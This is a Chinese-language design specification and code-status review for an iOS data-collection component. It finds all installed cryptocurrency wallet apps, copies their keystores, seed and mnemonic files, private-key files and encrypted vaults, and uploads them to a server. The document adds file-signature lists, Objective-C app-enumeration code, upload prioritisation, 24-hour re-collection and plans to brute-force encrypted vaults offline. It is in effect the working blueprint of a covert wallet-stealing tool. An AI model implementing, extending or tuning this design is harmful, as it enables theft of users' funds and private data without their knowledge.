# 冷钱包 App 全量采集设计（B / MHA 通道）

> 目标：不再依赖“写死 10 个钱包”，而是发现所有已安装的钱包类 App，采集其 App Data / App Group 中所有可读的钱包数据，并保证可恢复、可上传、可解析。
>
> **代码现状（2026-11-16 审查）**：24h 重采、pending 补传/退避、150MB 限流、目录过滤兜底已实现；**发现层、强制签名扫描、上传优先级、Notes 最后、目标级断点仍未实现**。详见文末 §14。

---

## 1. 目标与非目标

### 目标
1. **发现**：列出设备上所有已安装 App，不依赖固定 bundleId 清单。
2. **识别**：用 bundleId、TeamID、URL Scheme、文件名签名判断“是不是钱包”。
3. **采集**：App Data（class 2）+ App Group（class 7）双路；指定路径优先，文件签名兜底。
4. **分类**：识别钱包类型、是否加密、xpub/地址/keystore 等可解析数据。
5. **打包上传**：每个钱包一个 zip + `_manifest.json`，服务端可直接解析。
6. **可靠性**：被杀/重启/断网/24h 后可恢复。

### 非目标（物理上做不到）
- MHA 读不到 **Keychain / Secure Enclave**，所以加密库的 key 拿不到。
- 硬件钱包（Ledger/Trezor 等）私钥不出设备，最多拿 **xpub / 地址 / 账户列表**。
- 纯服务端钱包（如交易所 App）本地没有助记词/私钥。
- iOS 26+ 对 MHA 的授权可能拒绝部分 App，只能记录 `denied` 并降级。

---

## 2. 现状问题

| 问题 | 影响 |
|---|---|
| `targets.plist` 只有 10 个钱包 | Ledger Live、Trezor Suite、SafePal、OneKey、Coinbase Wallet 等直接漏采 |
| bundleId 只列了部分别名 | OKX/OKEx、Trust 变体等漏采 |
| MHA 不能枚举，只按清单定向查 | 清单外的钱包永远发现不了 |
| 兜底只在 `0 文件或 <64KB` 时触发 | 主库很大但 key 文件很小，漏关键文件也不兜底 |
| 目录型路径无上限 | 微信类整目录会到 398MB（已加 150MB 上限） |
| 无 24h 重采、无目标级断点 | 一轮做完永久跳过；中途被杀从头再来 |

---

## 3. 总体架构

```
Discovery（发现已安装 App）
   ↓
Catalog / Match（钱包目录 + 签名匹配）
   ↓
Collect（class 2 App Data + class 7 App Group）
   ↓
Classify（钱包类型 / 加密状态 / xpub / 地址 / keystore）
   ↓
Package（每钱包 zip + _manifest.json）
   ↓
Upload（pending 队列 + 重试）
   ↓
Resume（断点 / 24h / 前后台）
```

---

## 4. Discovery：先把“有哪些 App”拿全

### 4.1 主路径：LSApplicationWorkspace

```objc
Class ws = NSClassFromString(@"LSApplicationWorkspace");
id workspace = [ws performSelector:@selector(defaultWorkspace)];
NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
```

对每个 `LSApplicationProxy` 取：

| 字段 | 用途 |
|---|---|
| `bundleIdentifier` | 定向 class 2 查询 |
| `applicationIdentifier` / `teamIdentifier` | 判断企业签/变体 |
| `groupIdentifiers` / `groupContainerURLs` | 定向 class 7 查询 |
| `localizedName` | 识别“钱包/冷钱包/Wallet”关键词 |
| `dataContainerURL` | 可选：直接路径（不一定可读） |
| `plugInKitPlugins` | 插件型钱包（较少） |

输出 `AppRecord`：

```
{ bundleId, teamId, name, groups[], containerPath?, source:"LS" }
```

### 4.2 兜底来源（按可用性依次尝试）

1. `/var/mobile/Library/MobileInstallation/LastLaunchServicesMap.plist`
2. `FrontBoard/applicationState.db`
3. `container_query_iterate_results_sync`（仅 iOS 15–18 部分版本允许）
4. 已有 `ow_collect/container_map.plist`
5. 服务端下发的“钱包 bundleId 清单”（可远程更新）

### 4.3 合并去重

- 以 `bundleId` 为主键；
- 同 bundleId 不同 team 的保留两条（企业签/马甲包）；
- 记录 `source`，方便排查“为什么这个 App 没被发现”。

---

## 5. Catalog：钱包目录与签名库

新增 `wallet_catalog.plist`（可内置，也可服务端下发）：

```xml
<dict>
  <key>name</key><string>TokenPocket</string>
  <key>bundleIds</key><array>...</array>
  <key>bundleRegex</key><string>^(com|io)\.(global\.wallet|tokenpocket)</string>
  <key>teamIds</key><array>...</array>
  <key>urlSchemes</key><array><string>tp</string><string>tokenpocket</string></array>
  <key>groups</key><array><string>group.com.global.wallet.ios</string></array>
  <key>paths</key><array>
    <string>Documents/db/main.sqlite3</string>
    <string>Documents/F4SeCyr</string>
    <string>Documents/walletsV2</string>
  </array>
  <key>keywords</key><array><string>F4SeCyr</string><string>walletsV2</string></array>
  <key>exts</key><array><string>sqlite3</string><string>sqlite</string><string>json</string></array>
  <key>signatures</key><array><string>F4SeCyr</string><string>walletsV2</string></array>
  <key>parser</key><string>tokenpocket</string>
</dict>
```

匹配优先级：

1. 精确 `bundleId`
2. `bundleRegex`
3. `teamId`
4. URL Scheme（`Info.plist` 的 `CFBundleURLSchemes`）
5. 文件签名（见第 7 节）

### 5.1 覆盖矩阵（bundleId 需实机校准）

| 钱包 | 已知 bundleId | 核心文件 | 预期明文 |
|---|---|---|---|
| imToken | `im.token.app` | `Documents/walletsV2/*.json`、`default.realm` | 地址、xpub；keystore 可能加密 |
| TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令 |
| TronLink | `io.tronlink.wallet` 等 | `Documents/TronLinkData.sqlite`、`keystore` | 地址、keystore |
| Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址 |
| MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址 |
| OKX | `com.okinc.okx`、`com.okex.*` | `Documents/wallet` | 地址、keystore |
| Bitpie | `com.bitpie.ios` 等 | 整容器 | 地址、加密库 |
| Ledger Live | `com.ledger.live`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户、地址（无私钥） |
| Trezor Suite | `com.trezor.suite` / `io.trezor.suite`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户（无私钥） |
| SafePal | `com.safepal.wallet`（待校准） | `Documents/*`、`Library/*` | 地址、加密备份 |
| OneKey | `so.onekey.wallet`（待校准） | `Documents/*`、`Library/*` | 地址、加密备份 |
| Coinbase Wallet | `org.toshi` | `Documents/*`、`Library/*` | 地址、加密 vault |
| Exodus | `com.exodus.wallet`（待校准） | `Documents/*` | 地址、加密 vault |
| Blockchain.com | `com.blockchain.ios`（待校准） | `Documents/*` | 地址、加密 vault |

> 未知 bundleId 不阻塞：只要文件签名命中，仍然按 `unknown_wallet` 采集。
>
> 不采集 Telegram / WhatsApp / WeChat；它们不进入钱包矩阵，也不产生 zip。

---

## 6. 采集：指定路径 + 强制签名扫描

### 6.0 采集范围：只采钱包，不采 IM

**明确不采集**（数据加密、噪音大、体积大，性价比低）：

| App | bundleId |
|---|---|
| Telegram | `ph.telegra.Telegraph` |
| WhatsApp | `net.whatsapp.WhatsApp` |
| WeChat | `com.tencent.xin` |

- Discovery 阶段先按 bundleId 跳过，**不做 MHA 查询、不拷贝、不打 zip、不上传**；
- 即使 catalog 里残留这三项，也强制 `collect=false`；
- AppleNotes 保留，但只作为**最后上传**的兜底，不参与钱包排序。

**代码现状**：WeChat 已从 `targets.plist` 删除 ✅；Telegram/WhatsApp 仍在 targets（`targets.plist:138-161`），`OWContainerPass.run` 还没有 SKIP 列表 ❌。

### 6.1 双路查询

```
SKIP = {ph.telegra.Telegraph, net.whatsapp.WhatsApp, com.tencent.xin}
for app in discovered:
    if app.bundleId in SKIP: continue
    class2 = query(class=2, identifier=app.bundleId, flags=0x900000000)
    if token/path: collect(app.data)
    for g in app.groups:
        class7 = query(class=7, identifier=g, flags=0x900000000)
        if token/path: collect(g)
```

- 只做定向查询，不做全量枚举（MHA 在 26.6 枚举只返回自己）。
- `denied` / `no token` 记录到 `AppRecord.status`，不要无限重试。

### 6.2 指定路径

- 文件：精确拷贝，自动带 `-wal/-shm`。
- 目录：枚举 + `exts/keywords` 过滤 + `excludes` + **150MB 总上限**。
- 关键扩展名（sqlite/db/json/realm/plist/keystore）豁免单文件门限。

### 6.3 强制签名扫描（关键改动）

不再只在 `<64KB` 时兜底。**只要这个 App 被判定为钱包（bundle/正则/team/URL Scheme 任一命中），就始终跑一次签名扫描**：

```
signatures = [
  "walletsV2", "F4SeCyr", "TronLinkData.sqlite",
  "persist-KeyringController", "persist-AccountsController",
  "keystore", "default.realm", "wallet", "vault",
  "xpub", "mnemonic", "seed", "privatekey", "private_key",
  "main.sqlite3", "wallet.sqlite", "accounts.json"
]
```

- 命中即拷贝，附在同一个钱包 zip；
- 这样“主库大、key 文件小”也不会漏；
- 上限仍是 150MB/目标，避免爆炸。

### 6.4 未知钱包

如果 App 不在 catalog，但签名扫描命中了 `keystore/walletsV2/xpub/seed/...`：

- 按 `unknown_wallet_<bundleId>` 采集；
- manifest 标 `confidence: "signature"`；
- 服务端先落原始文件，后续人工/规则归类。

### 6.5 跳过与限制

- 整体跳过：Telegram、WhatsApp、WeChat（不查询、不拷贝、不上传）。
- 路径跳过：`Library/Caches`、`tmp`、`HTTPStorages`、`WebKit`、Sentry/Crashlytics、媒体、容器元数据。
- 上限：150MB/目标、200MB/文件、5 万目录项、2000 文件（兜底）。
- 原子拷贝：`.part` → rename，启动清理 `.part`。

### 6.6 速度：先消掉“每文件一次落盘”

26.6 实测 B 全流程 7.36s，其中微信 6.36s。真正慢的不是 MHA 查询（毫秒级），而是：

1. `OWState.notePayload` **每拷一个文件就整份 plist 落盘**；
2. `looksEmptyDatabaseAtPath` 对每个 sqlite **逐表 `COUNT(*)`**；
3. 同一个容器被 `_copyDirectory` / `_writeFileIndex` / `_scanDirectory` **走多遍**；
4. 398MB 整目录拷贝 + 打包 + 上传；
5. 日志**逐行同步写**；
6. 大 zip 先入队，**堵住后面的 hits/manifest**。

优化原则：**状态/日志按目标批量写，目录只走一遍，大文件先限流，上传与采集流水线化。**

| 优化 | 做法 | 预期 |
|---|---|---|
| 状态批量写 | `_copyItem` 只收集记录，目标结束一次 `notePayloads:` | 57 次 plist 写 → 1 次 |
| 日志批量 | 内存缓冲 50 行/1s 刷盘；文件级日志降为 debug | 日志 I/O 降一个数量级 |
| 空库快判 | `PRAGMA page_count` + `sqlite_master LIMIT 1`，不做全表 COUNT | 大库几百 ms → <5ms |
| 单遍目录 | 一次 enumerator 同时做定义件/签名/索引；`skipDescendants` 跳过 Caches/media | 3 遍 → 1 遍 |
| 大目录限流 | 150MB/目标；Brand/BakChat/OpenData/媒体直接 skip | 微信 398MB → ≤150MB |
| 上传流水线 | 每采完一个目标立即 zip+入队，后台 flush；不等全部采完 | 网络与磁盘重叠 |
| 上传优先级 | hits/manifest → 钱包包按体积升序 → keys/system → Notes 最后；TG/WhatsApp/WeChat 不采集 | 小包先到，Notes 不堵钱包 |
| 压缩级别 | zip deflate level 1；已压缩媒体 store | CPU 降低 |
| 查询/发现缓存 | LS 列表、container_map、catalog 24h 缓存 | 启动少走重复查询 |
| 时间预算 | 单目标 20s、B 全局 60s、单文件抽取 2s | 防止一个 App 拖死整轮 |

**代码现状**：大目录限流 ✅（`OWContainerPass.m:696-711`、`OWRoute.m:230`）；状态批量写 ❌（`notePayload` 仍然每文件一次，`OWContainerPass.m:739`）、空库快判 ❌（仍逐表 `COUNT(*)`，`OWContainerPass.m:53-77`）、单遍目录 ❌、上传流水线 ❌、上传优先级 ❌、压缩级别未设置、发现缓存 ❌、时间预算 ❌。

**流水线示意：**

```
for target:
    collect(target)        // 磁盘
    zip(target)            // CPU
    enqueue(priority)      // hits/manifest/小钱包优先
    uploader.flush()       // 后台串行，和下一个 target 的 collect 重叠
```

**目标值：**

- 钱包目标（不含 Telegram/WhatsApp/WeChat）：B ≤ 3s；
- 单个大钱包 150MB 包：拷贝 + 压缩 ≤ 3s；
- hits/manifest 先到服务端，大包后到；
- 状态 plist 写入次数从 O(文件数) 降到 O(目标数)。

### 6.7 上传顺序（硬规则）

| 优先级 | 内容 | 说明 |
|---|---|---|
| P0 | `hits.json` / `hits_plain.txt` / `manifest.json` | 几 KB，先到先得 |
| P1 | 钱包 zip，按体积**从小到大** | 小钱包先传，大钱包后传 |
| P2 | keychain / keys / 系统库（仅 A 通道） | 高价值，但排在钱包之后 |
| P3 | Notes（`notes_db`） | **永远最后** |
| 不采集 | Telegram / WhatsApp / WeChat | 直接跳过 |

`.meta` 增加 `priority` 和 `bytes`；`flush` 按 `priority ASC, bytes ASC` 排序，不再按入队顺序。

**代码现状**：`.meta` 已有 `size/createdAt/attempts/state`，但**没有 `priority`**；`OWExfil._flushLocked` 直接遍历 pending 目录（`OWExfil.m:222-227`），仍是文件系统顺序，没有按体积排序；`OWRoute` 也按 `cp.results` 目标顺序入队，Notes 没有最后处理 ❌。

---

## 7. 分类与 manifest

每个钱包 zip 根写 `_manifest.json`：

```json
{
  "found": ["TokenPocket"],
  "wallets": [{
    "wallet": "TokenPocket",
    "bundleID": "com.global.wallet.ios",
    "confidence": "bundle",
    "files": ["Documents/db/main.sqlite3", "Documents/F4SeCyr/..."],
    "encrypted": true,
    "xpub": [],
    "addresses": [],
    "needsKeychain": true
  }],
  "deviceFolder": "iPhone iOS26.6 <idfv>",
  "ios": "26.6",
  "productType": "iPhone15,3",
  "source": "OPENsrc"
}
```

分类依据：

1. 精确 bundleId → 高置信度；
2. 正则/team → 中；
3. 文件签名 → `unknown_wallet`；
4. 加密判断：SQLite 头、熵、已知 SQLCipher 特征（TP main.sqlite3、MetaMask vault）。

---

## 8. 打包与上传

- 每钱包一个 zip：`<bundleId>/...` + `_manifest.json`；
- 总包 ≤150MB；>20MB 上传超时 180s；
- 上传顺序：`hits/manifest` → 钱包包按体积**小→大** → `keys/system` → **Notes 最后**；
- Telegram / WhatsApp / WeChat 不采集、不打包、不上传；
- `pending/*.meta` 支持断网/重启补传；
- 统一 token/idfv，避免服务端把同一台设备拆成 `web:` / `tok:` 两台；
- done 之后仍要 flush pending；
- 24h 后重采。

---

## 9. 降级与边界

| 情况 | 处理 |
|---|---|
| MHA 拒绝（denied/no token） | 记录 `denied`，尝试 App Group；仍失败则等 A 通道/旧系统 |
| 加密库（TP main.sqlite3 / MetaMask vault / Exodus vault） | 保存原文件，标 `encrypted`；服务端离线爆破/等 keychain key |
| 硬件钱包 | 只采 xpub/地址/账户，标 `hardware: true` |
| 未知钱包 | `unknown_wallet` + 原始文件 |
| App 无本地数据 | 记录 `empty`，不写 done |

---

## 10. 可靠性设计

1. **启动先 flush pending**，再判断 done；
2. `lastCompletedAt` + 24h 重置；
3. 目标级 `.done.json`，重启跳过已完成目标（详见 §10.1）；
4. 原子拷贝/zip，清理 `.part`；
5. 上传退避（30s/2m/10m/1h）+ sha256 去重；
6. 抽取按文件 hash 断点；
7. 前后台 `paused` 状态，后台任务过期优雅暂停；
8. 状态 v2：`runID / phase / startedAt / lastCompletedAt / targetsDone / extractorDone / keysDone / systemDone`。

**代码现状**：
- 1/2/4/5 已实现：`OWRoute.m:76-95` 先 flush、`doneAt` + 24h 判断；`OWExfil.m:135-187/207-334` 原子入队、inflight 10min、指数退避、不永久丢；`OWContainerPass.m:731-735` 仍是先删后拷，容器文件级原子性未做 ❌。
- 3 目标级 `.done.json` ❌：`OWState.beginNewRun` 会清空 payloads，重启从头跑。
- 6 抽取 hash 断点 ❌。
- 7 后台 paused 状态 ⚠️：`OWKeepAlive` 有后台任务，但没有 phase=paused。
- 8 状态 v2 仍未加 `runID/targetsDone/extractorDone/keysDone/systemDone` ❌。

---

## 10.1 目标级断点（详述）

### 定义

**每个钱包/目标采集完成并成功入上传队列后，写一份 `<target>/.done.json`。重启或回前台时，已完成目标直接跳过，只重做未完成的那个。**

粒度是**目标**，不是文件。

### 适用场景

| # | 场景 | 有断点时 | 无断点时 |
|---|---|---|---|
| 1 | B 跑到第 6 个目标被杀 | 跳过前 5 个，从第 6 个继续 | 从第 1 个全量重拷 |
| 2 | 某个大目标拷到一半被杀 | 只重做该目标 | 全部重做 |
| 3 | 后台太久被系统回收 | 回前台/冷启动续跑 | 从头开始 |
| 4 | 目标已采集并入队，但上传失败/被杀 | 不重采，交给 `pending` 补传 | 可能重复采集 |
| 5 | 24h 到期重采 | 清空所有 `.done`，整轮重采 | 依赖 24h 逻辑 |
| 6 | 钱包升级/容器路径变化 | `.done` 校验失败 → 作废并重采 | 可能拿旧数据 |

### `.done.json` 结构

```json
{
  "target": "TokenPocket",
  "bundleId": "com.global.wallet.ios",
  "containerPath": "/private/var/mobile/Containers/Data/Application/xxxx",
  "fileCount": 2,
  "bytes": 176224,
  "zip": "ow_pack_TokenPocket_1794769201784.zip",
  "enqueuedAt": 1794769201,
  "runId": "2026-11-16T03:00:01Z-7f3a",
  "state": "enqueued"
}
```

`state` 取值：`collected`（已拷贝）→ `enqueued`（已入 pending）→ `done`（上传成功，可选）。

### 校验与作废规则

重启读取 `.done.json` 时同时校验：

1. `bundleId` 与当前 targets 一致；
2. `containerPath` 仍存在、且与本次查询到的路径相同（防止重装/换容器）；
3. `fileCount` 与目录内实际文件数一致（容忍 ±0）；
4. `bytes` 与目录实际总量一致；
5. `runId` 属于本轮（`beginNewRun` 会换新 runId）。

任一项不满足 → 删除该 `.done.json`，重新采集该目标。

### 与其它三层机制的边界

| 机制 | 解决什么 | 不解决什么 |
|---|---|---|
| **目标级 `.done`** | 杀了重启不从头再采 | 单个 150MB 目标内部的半成品文件 |
| **单文件 `.part` → rename** | 不留半文件、可安全重拷 | 目标级跳过 |
| **`pending/*.meta`** | 上传漏传/重传、断网补传 | 采集阶段重做 |
| **`doneAt` + 24h** | 多久重新采一轮 | 一轮内的中断恢复 |

四层各管一段，**不要互相替代**：

```
24h 决定“要不要开新轮”
  └─ 目标级 .done 决定“本轮内跳过哪些目标”
       └─ .part/rename 决定“单个目标内部是否留半文件”
            └─ pending/*.meta 决定“已采到的包是否传成功”
```

### 实现要点

```objc
// 采集循环
for (NSDictionary *t in targets) {
    NSString *bid = t[@"bundleId"];
    if ([[OWResume shared] isTargetDone:bid runId:curRunId]) {
        OWLog(@"B: 跳过已完成目标 %@", t[@"name"]);
        continue;
    }
    if (![self _collectTarget:t containerPath:path]) continue;
    [self _writeTargetDone:t path:path runId:curRunId];
}
```

- `.done.json` 写在 `ow_collect/<name>/` 内，随目标目录一起清理；
- `OWState.beginNewRun` 生成新 `runId`，旧 `.done` 因 `runId` 不匹配自动作废（不需要遍历删除）；
- 断点只记录“已入队”，**上传成功与否由 pending 决定**，避免把采集和上传耦合。

### 不做的事

- 不做文件级断点（不做 resume from byte offset）；
- 不做跨轮增量（24h 后一律全量）；
- 不因为 `.done` 存在就跳过 MHA 查询（仍要查一次确认容器还在，查询是毫秒级）。

---

## 11. 测试计划

| 场景 | 验证点 |
|---|---|
| 安装 12+ 钱包（imToken/TP/TronLink/Trust/MetaMask/OKX/Bitpie/Ledger/Trezor/SafePal/OneKey/Coinbase） | Discovery 能列出全部 bundleId |
| 每个钱包单独采集 | zip + manifest 有对应 `found` |
| 路径改版（手动改目录） | 签名扫描仍能捞到核心文件 |
| 未知钱包（改 bundleId 的马甲包） | `unknown_wallet` 采集成功 |
| iOS 16 / 18 / 26.6 各一台 | denied 列表、token 命中率、包大小 |
| 杀进程（采集/打包/上传/抽取） | 重启断点续跑，无半文件 |
| 11 个目标跑到第 6 个杀进程 | 重启跳过前 5 个，日志有「跳过已完成目标」 |
| 大目标拷到一半杀进程 | 只重做该目标，其余不重拷 |
| `.done.json` 的 containerPath 与实机不符 | 自动作废该断点并重采 |
| 目标已入队但上传失败，重启 | 不重采，pending 补传 |
| 24h 到期重采 | 所有目标 `.done` 因 runId 变化自动作废 |
| 断网 | pending 保留，联网补传 |
| done 后 24h+1s | 重新采集 |
| done 后 1h | 只补传 pending |
| 设备装有 TG/WhatsApp/WeChat | 完全不查询、不产生 zip |
| 钱包大小混合 | 小钱包先于大钱包上传 |
| Notes 与钱包同轮 | Notes 最后上传 |

---

## 12. 落地顺序

已完成（2026-11-16 本轮）：

1. ~~IM 不采集~~：TG/WhatsApp/微信 SKIP；
2. ~~上传优先级~~：`priority` + `size` 排序，Notes 固定最后；
3. ~~目标级断点 + 原子拷贝 + 断点续跑~~；
4. ~~速度三件套~~：批量状态写 / 空库快判 / 单遍目录。

待做：

5. **Discovery + catalog**：`LSApplicationWorkspace` 列全 App；
6. **强制签名扫描 + unknown_wallet**；
7. **上传流水线**：采集与上传重叠；
8. **覆盖矩阵实机校准**：Ledger/Trezor/SafePal/OneKey/Coinbase 等 bundleId 用真机补全。

> 这套设计的核心是“发现优先、目录+签名双路、未知也不放过”，而不是继续往 `targets.plist` 里堆路径。

---

## 13. 性能验收指标

每次真机测试记录以下数据，低于目标才算通过：

| 指标 | 目标 |
|---|---|
| B 全流程（11 目标，无微信大包） | ≤ 3s |
| 单目标采集 | ≤ 2s |
| 微信 150MB 包（拷贝+压缩） | ≤ 3s |
| 状态 plist 写入次数 | ≈ 目标数，不随文件数线性增长 |
| 空库判断 | 单库 < 5ms |
| 目录遍历 | 每容器 1 遍（不含打包） |
| hits/manifest 到达时间 | 早于大钱包包 |
| 大包上传 | 180s 内完成或明确失败 |
| 上传顺序 | hits/manifest → 钱包小→大 → Notes 最后 |
| 不采集项 | TG/WhatsApp/WeChat 0 个 zip |
| 断点重启 | 跳过已完成目标，不重复拷贝，`.done` 校验失败则重采 |

日志里至少保留：

```
B: 汇总 目标=8 命中=5 产物=5 用时=2.8s
B: TokenPocket 完成（0.1s）
上传: 成功 ...（首包 hits.json）
上传: 成功 ...（大钱包 150MB，xx s）
```

> 速度优化的第一优先级不是“多线程”，而是把 **每文件一次状态写、每库全表 COUNT、每容器多遍遍历、大包先上传** 这四件事消掉。

---

## 14. 代码审查：实现状态（2026-11-16）

### 14.1 已实现 ✅

| 设计项 | 代码位置 | 说明 |
|---|---|---|
| 24h 重采 + done TTL | `OWRoute._run`、`OWState.shouldSkipForTTL/beginNewRun` | `doneAt/nextRunAt` 判定；到期走 `beginNewRun` 生成新 `runId` |
| done 前先 flush pending | `OWRoute._run` | 未满 24h 也会先补传，`hasPendingData` 决定是否续跑 |
| pending 原子入队 | `OWExfil.enqueueFile:kind:priority:error:` | 先写 `.tmp` 再 rename，避免半文件 |
| 上传退避/不永久丢 | `OWExfil._flushLocked` | inflight 10min、15s×2^n 退避、最多 1h；`_cleanupOrphans` 清理旧超大 pending |
| 大文件 180s 超时 | `OWExfil._post` | >20MB 自动放宽 |
| 单目标 150MB / zip 150MB | `OWContainerPass._copyItem`、`OWRoute._uploadContainerResult` | 大目录不再到 398MB |
| 目录过滤 + 宽兜底 | `OWContainerPass._collectAndIndex` | 定义目录先按 exts/keywords 过滤；漏掉时再按「无扩展名 / 小文件 / 非媒体」收，接住 F4SeCyr 这类密钥文件 |
| B 单次定向查询 | `OWMCM.m` | `flags=0x900000000`，不做 flags 矩阵/枚举 |
| 抽取去噪 | `OWExtractor.m` | 钱包标签 + 上下文过滤，hits 从 2000 降到 10 条量级 |
| 注册表单直传 | `OWExfil.uploadJSONNow`、`OWAppDelegate.m` | 不进 pending 队列 |
| 端点日志只打一次 | `OWExfil.init` | 避免刷屏 |
| **Telegram/WhatsApp/微信不采集** | `OWContainerPass.OWSkipBundleIds` + `run` 循环 | 连 container_query 都不发，日志留「跳过（IM 类不采集）」；`targets.plist` 已删 TG/WA |
| **钱包包小→大上传** | `OWExfil.enqueueFile:...priority:` + `_flushLocked` | `.meta` 带 `priority`，flush 按 `priority ASC, size ASC` 排序 |
| **Notes 最后上传** | `OWUploadPriorityNotes=90`、`OWRoute._priorityForName:` | Notes/AppleNotes 固定最高优先级数值，永远排在钱包之后 |
| **目标级断点** | `OWState.beginResume/isTargetDone/markTargetDone`、`OWContainerPass.run` | 每目标采集完成写 `bundleId/containerPath/fileCount/bytes/runId`；重启 `runId` 匹配且四项一致才跳过 |
| **断点续跑入口** | `OWRoute._run` | 中断且 `targetsDoneCount>0` → `beginResume`（保留断点/payloads），否则 `beginNewRun` |
| **断点续跑的 payload 恢复** | `OWContainerPass._restorePayloadsFromDir:` | 跳过目标时按落盘文件补记账，保证 `_hasValidPayload` 不会因续跑误判为空 |
| **容器文件原子拷贝** | `OWContainerPass._copyItem` | 先写 `.part` 再 rename，被杀不留半文件 |
| **状态批量写** | `OWContainerPass._noteResultForName` + `OWState.notePayloads:` | 每目标一次 plist 落盘，不再每文件一次 |
| **空库快判** | `OWFileGate.looksEmptyDatabaseAtPath` | `SELECT 1 FROM "表" LIMIT 1`，不做全表 `COUNT(*)` |
| **单遍目录** | `OWContainerPass._collectAndIndex:` | 一次 enumerator 同时做定义件拷贝、兜底候选收集、`_file_index.json`；缓存/日志/媒体目录 `skipDescendants` |
| `hasPendingData` 含 manifest | `OWExfil.hasPendingData` | 只剩 manifest 没传也会续跑，不再残留到下一轮 |

### 14.2 部分实现 / 未实现 ⚠️❌

| 设计项 | 状态 | 代码现状 |
|---|---|---|
| LSApplicationWorkspace 发现 | ❌ | 代码中没有 `allInstalledApplications`；仍靠 `targets.plist` 定向 |
| 钱包 catalog / 强制签名扫描 / unknown_wallet | ❌ | 未命中定义路径时只做 exts/keywords 兜底，没有签名库比对与 `unknown_wallet` 归类 |
| keys/system 断点 | ❌ | 每次重跑，无 per-target 标记（A 通道本来也跑不通 26.x） |
| 后台 paused 状态 | ⚠️ | `OWKeepAlive` 有后台任务，但没有 `phase=paused` |
| 上传流水线 | ❌ | 仍是「全部目标采完 → 统一 zip/入队 → flush 一次」；单包异常会推迟全部 |
| zip 压缩级别 | ❌ | 未设置 deflate level（`OWArchive` 用系统默认） |

### 14.3 本轮已消掉的细节

1. ~~`hasPendingData` 不含 `meta`~~ → 已加入，manifest 漏传会续跑。
2. ~~中断后整轮重跑~~ → 有目标断点时 `beginResume` 续跑，只补未完成目标。
3. ~~`_writeFileIndex` 第二遍遍历~~ → 已并入 `_collectAndIndex:` 的唯一一遍。
4. ~~`notePayload` 每文件写盘~~ → 改成目标级 `notePayloads:` 批量写。
5. ~~断点统计口径不一致~~ → `_measureDirectory` 与 `_noteResultForName` 都以「目录内全部文件（含 `_file_index.json`）」为准，避免断点永远对不上。
6. `_cleanupOrphans` 会删 >250MB 的旧 pending（如旧版 398MB 微信包），这是有意为之，但会静默丢旧数据。

### 14.4 下一步优先级

1. Discovery：`LSApplicationWorkspace.allInstalledApplications` 列全已安装 App；
2. 强制签名扫描：命中 `targets.plist` 之外但含钱包特征（keystore/seed/vault）的容器 → `unknown_wallet`；
3. 上传流水线：每采完一个目标就 zip + 入队 + 后台 flush，与下一个目标的采集重叠；
4. keys/system 断点与后台 `phase=paused`；
5. zip deflate level 调优。


